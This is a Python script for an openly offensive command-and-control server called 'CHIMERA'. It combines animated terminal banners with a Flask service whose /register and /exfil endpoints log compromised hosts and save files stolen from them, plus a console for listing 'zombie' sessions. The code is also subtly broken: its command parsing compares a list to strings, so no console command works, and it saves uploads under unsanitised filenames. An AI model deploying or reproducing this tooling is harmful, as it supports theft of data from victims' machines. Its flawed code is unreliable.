#!/usr/bin/env python3

import os
import sys
import json
import threading
import time
from datetime import datetime
from colorama import init, Fore, Style
import pyfiglet

# ==========================================
# INIT & CONFIGURATION
# ==========================================
init(autoreset=True)

CHIMERA_CONFIG = {
    "C2_HOST": "0.0.0.0",
    "C2_PORT": 5000,
    "DATA_DIR": "./chimera_exfil/"
}

os.makedirs(CHIMERA_CONFIG["DATA_DIR"], exist_ok=True)

# Global variable to store sessions
sessions = {}

# ==========================================
# BANNER FUNCTIONS
# ==========================================
def animate_falcon():
    os.system('clear')
    print("\n\n")
    x = -20
    falcon_art = [
        r"          \       /            ",
        r"           \  '  /             ",
        r"         '- .`-'. .-'          ",
        r"      .' .-' . `-. `-.         ",
        r"   .' .-'   .   `-.   `-.      ",
        r"   \   /     \     \     \     ",
        r"    `-/       `     `      `   "
    ]
    try:
        while x < 80:
            os.system('clear')
            print("\n\n")
            for _ in range(8): print()
            prefix = " " * x
            color = Fore.MAGENTA
            for line in falcon_art:
                spaces = " " * (10)
                print(f"{spaces}{prefix}{color}{line}")
            if x > 5:
                trail = " " * (x + 10) + Fore.CYAN + " ~ ~ ~ " + Style.RESET_ALL
                print(trail)
            x += 3
            time.sleep(0.08)
    except:
        pass

def print_glowing_banner():
    try:
        banner = pyfiglet.figlet_format("CHIMERA", font="slant")
    except:
        banner = "CHIMERA"
    lines = banner.split('\n')
    colors = [Fore.CYAN, Fore.MAGENTA, Fore.BLUE, Fore.GREEN]
    print(Fore.RED + "="*70 + Style.RESET_ALL)
    print()
    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        print(" " + line)
        print(f"    {color}{line}")
    print()
    print(Fore.RED + "="*70 + Style.RESET_ALL)
    print(f"\n\n    {Fore.YELLOW}{Style.BRIGHT}>>> DEVELOPED BY: CVJ THE CYBER WOLF {Style.RESET_ALL}")
    print(f"    {Fore.CYAN}[*] Boot Sequence Complete. Loading Modules...{Style.RESET_ALL}")
    print()

# ==========================================
# FLASK SERVER
# ==========================================
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        session_id = data.get('id')
        sessions[session_id] = {
            "ip": request.remote_addr,
            "os": data.get('os'),
            "registered": datetime.now().isoformat()
        }
        print(f"\n{Fore.GREEN}[+] INFILTRATION: {session_id} from {request.remote_addr}{Style.RESET_ALL}")
        return jsonify({"status": "registered", "session": session_id})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/exfil', methods=['POST'])
def receive_data():
    if 'file' in request.files:
        file = request.files['file']
        filepath = os.path.join(CHIMERA_CONFIG["DATA_DIR"], file.filename)
        file.save(filepath)
        print(f"\n{Fore.CYAN}[+] EXFIL: {filepath}{Style.RESET_ALL}")
    return jsonify({"status": "received"})

def run_flask():
    app.run(host=CHIMERA_CONFIG["C2_HOST"], port=CHIMERA_CONFIG["C2_PORT"], debug=False, use_reloader=False)

# ==========================================
# CLI INTERFACE (PATCHED)
# ==========================================
def cli_interface():
    print(f"\n{Fore.WHITE}CHIMERA C2 Console {Style.RESET_ALL}| Port: {CHIMERA_CONFIG['C2_PORT']} | Type 'help'")
    print(f"{Fore.CYAN}[*] CLI Ready. Server running in background.{Style.RESET_ALL}")
    
    while True:
        try:
            user_input = input(f"CHIMERA> ").strip()
            if not user_input:
                continue
            
            cmd_parts = user_input.split()
            main_cmd = cmd_parts
            
            if main_cmd == "help":
                print(f"""
    {Fore.CYAN}CHIMERA COMMANDS:{Style.RESET_ALL}
      sessions    : {Fore.GREEN}List connected targets{Style.RESET_ALL}
      clear       : Clear the screen
      exit        : Shut down the server and exit
      help        : Show this menu
                """)
            
            elif main_cmd == "sessions":
                if sessions:
                    print(f"\n{Fore.GREEN}[+] ACTIVE SESSIONS ({len(sessions)}):{Style.RESET_ALL}")
                    for session_id, info in sessions.items():
                        print(f"  ID: {Fore.MAGENTA}{session_id}{Style.RESET_ALL} | IP: {info['ip']} | OS: {info['os']}")
                else:
                    print(f"[-] No active sessions. Waiting for zombies to call home...")
            
            elif main_cmd == "clear":
                os.system('clear')
            
            elif main_cmd == "exit":
                print(f"\n{Fore.RED}[*] Shutting down C2 server. Goodbye.{Style.RESET_ALL}")
                os._exit(0) # Force exit everything
            
            else:
                print(f"[-] Unknown command: '{main_cmd}'. Type 'help' to see available commands.")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Use 'exit' to quit gracefully.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] CLI Error: {e}{Style.RESET_ALL}")

# ==========================================
# MAIN EXECUTION
# ==========================================
if __name__ == '__main__':
    # Start Flask in a background thread
    server_thread = threading.Thread(target=run_flask)
    server_thread.daemon = True
    server_thread.start()

    # Show Banner and CLI
    animate_falcon()
    print_glowing_banner()
    
    # Run the CLI in the main thread (keeps the program alive)
    cli_interface()
